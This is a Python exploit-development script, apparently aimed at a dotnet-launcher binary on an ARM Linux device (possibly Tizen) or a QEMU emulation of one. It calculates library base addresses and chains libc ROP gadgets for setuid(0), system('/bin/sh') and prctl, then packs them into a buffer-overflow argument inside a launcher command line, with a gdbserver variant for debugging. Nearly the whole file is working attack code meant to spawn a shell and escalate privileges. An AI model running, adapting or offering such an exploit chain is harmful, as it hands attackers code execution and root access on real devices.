import random
import struct

"""
qemu should be 0x3f70a654
is 0x3f6f0654
(-0x1a000)
"""

# is_vm = False
# is_rand = True

# rand_range = 0xff << 12

# page = 1 << 12

# pgoff = 0xc0000000
# stack = 0x9000000
# unk = 0 if is_vm else 0x800000
# max_mmap = pgoff - stack - unk
# min_mmap = (max_mmap - rand_range) if is_rand else max_mmap

# avg_mmap = (min_mmap + max_mmap) // 2 // page * page

is_vm = True

def from_ld_top(addr):
    return ld_top - (real_ld_top - addr)

if is_vm:
    ld_top = 0xb6fef000
    real_ld_top = 0xb6fef000

    libbt_base = from_ld_top(0xb59b3000)
    libht_base = from_ld_top(0xb5c49000)
    libc_base = from_ld_top(0xb6e95000)
else:
    ld_top = 0xb6795000
    real_ld_top = 0xb6702000

    libbt_base = from_ld_top(0xb19f5000)
    libht_base = from_ld_top(0xb532b000)
    libc_base = from_ld_top(0xb6572000)


libbt_jump = 0x6e3b0 - 0x6e388 + 0x6e389 + libbt_base - libht_base

libc_vmap = 0x42a80000

def in_libc(addr):
    return libc_base + addr - libc_vmap

def p(addr):
    return struct.pack("<I", addr)

def c(addr):
    return p(in_libc(addr))

mov_r0_0_pop_1 = in_libc(0x42aaaf84)

bin_sh = libc_base + 0x01157b4

pop_r0_1_pc = in_libc(0x42af6f4c)

r3_setuid_addr = libc_base + 0x1397b8 # 0xb6fce7b8
pop_r3_to_pc = in_libc(0x42aaa0ac)
jump_setuid_off_12 = in_libc(0x42b1bedc + 12)

i_call_setuid = struct.pack("<I", in_libc(0x42b1bedc))

exit_addr = 0x42b1b654

jmp_exit = in_libc(0x42b1b654) - libht_base

jmp_sleep = in_libc(0x42b1b044) - libht_base

pop_lr = in_libc(0x42ab86d0)
call_prctl = in_libc(0x42b4f1f0)

def f(n):
    ch = "A"
    r = b""
    for _ in range(n):
        r += bytes(ch * 4, "ascii")
        ch = chr(ord(ch)+1)
    return r

print(f(3) + struct.pack("<I", 0x12345678))

loc_prctl = 0x42b4f1f0
loc_sleep = 0x42b1b044
loc_usleep = 0x42b48a4c
loc_pop_r01pc = 0x42af6f4c

loc_r1_1_p2 = 0x42b26668
loc_r0_4_p9 = 0x42b2bb70
# loc_pop_l_b3 = 0x42adbab0
loc_pop_x2l_b3 = 0x42a97cfc

# loc_r1_1 r1=1,r0=r1,pop 2x,pc
# loc_r0_4 r0=4, pop r3, 8x,pc
# loc_pop_r4l_b3 pop r4, lr, bx r3
# prctl pop 2x
p_call_prctl = c(loc_r1_1_p2) + f(2) \
    + c(loc_r0_4_p9) + c(loc_prctl) + f(8) \
    + c(loc_pop_x2l_b3) + f(2) \
    + c(loc_pop_r01pc) + p(0x7fffffff) + f(1) + c(loc_usleep)

# print(hex(in_libc(loc_pop_l_b3)))

i_put_0_in_r0 = struct.pack("<I", mov_r0_0_pop_1) + b"AAAA"
i_call_setuid_off_12 = struct.pack("<I", pop_r3_to_pc) + struct.pack("<I", r3_setuid_addr) \
     + b"444455556666777788889999AAAABBBB" + struct.pack("<I", jump_setuid_off_12) + b"DDDD"

i_put_sh_in_r0 = struct.pack("<I", pop_r0_1_pc) + struct.pack("<I", bin_sh) + b"AAAA"
i_call_system = struct.pack("<I", in_libc(0x42ab7f94))

p_shell = i_put_sh_in_r0 + i_call_system

p_setuid = i_put_0_in_r0 + i_call_setuid_off_12

inner_payload = p_shell

payload = b"AAAABBBBCCCC" + inner_payload + b"XX" #b"X"

payload_s = str(payload)[1:]

if '\\n' in payload_s or '\\x00' in payload_s:
    print("ILLEGAL CHARS IN PAYLOAD")

base_cmd = f"CORECLR_PROFILER_PATH=/home/owner/share/tmp/sdk_tools/heaptrack/libprofiler.so /usr/bin/dotnet-launcher --standalone `printf {payload_s}`"
cmd = base_cmd.split()
cmd.insert(1, "gdbserver :1234")
full_cmd = " ".join(cmd)


print(base_cmd)
print(full_cmd)

print(f"""libbt: 0x{libbt_base:08x}
libht: 0x{libht_base:08x}
libc: 0x{libc_base:08x}
ld_top: 0x{ld_top:08x}
""")

print("EXIT:", hex(jmp_exit))
print("SLEEP:", hex(jmp_sleep))
print(hex(libbt_jump))
# print(hex(min_mmap), hex(max_mmap))

off = libc_base - libht_base
exit_libc_off = exit_addr - libc_vmap

print(hex(off), hex(exit_libc_off), hex(off + exit_libc_off))